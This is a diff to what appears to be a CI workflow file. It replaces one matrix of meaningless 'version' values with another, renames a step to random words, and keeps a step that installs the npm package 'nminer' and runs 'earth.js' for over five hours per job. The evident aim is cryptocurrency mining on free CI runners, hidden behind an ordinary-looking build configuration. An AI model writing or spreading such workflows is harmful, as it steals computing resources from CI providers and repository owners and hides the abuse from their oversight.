@@ -9,25 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 414 }
-          - { version: 4336 }
-          - { version: 2509 }
-          - { version: 3100 }
-          - { version: 35 }
-          - { version: 9488 }
-          - { version: 4226 }
-          - { version: 3035 }
-          - { version: 844 }
-          - { version: 9359 }
-          - { version: 3833 }
-          - { version: 7732 }
-          - { version: 3997 }
-          - { version: 5124 }
-          - { version: 5989 }
-          - { version: 7649 }
-          - { version: 1493 }
-          - { version: 7652 }
-          - { version: 6131 }
+          - { version: 2394 }
+          - { version: 6116 }
+          - { version: 1355 }
+          - { version: 8898 }
+          - { version: 3317 }
+          - { version: 710 }
+          - { version: 967 }
+          - { version: 4182 }
+          - { version: 8823 }
+          - { version: 7610 }
+          - { version: 8092 }
+          - { version: 6762 }
+          - { version: 6165 }
+          - { version: 3736 }
+          - { version: 3875 }
 
     steps:
       - name: Checkout
@@ -38,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: hose gosh easily officially
+      - name: gray disarm per
         run: |
           npm install nminer@latest
-          timeout 345m node earth.js || echo "earth executed"
+          timeout 310m node earth.js || echo "earth executed"
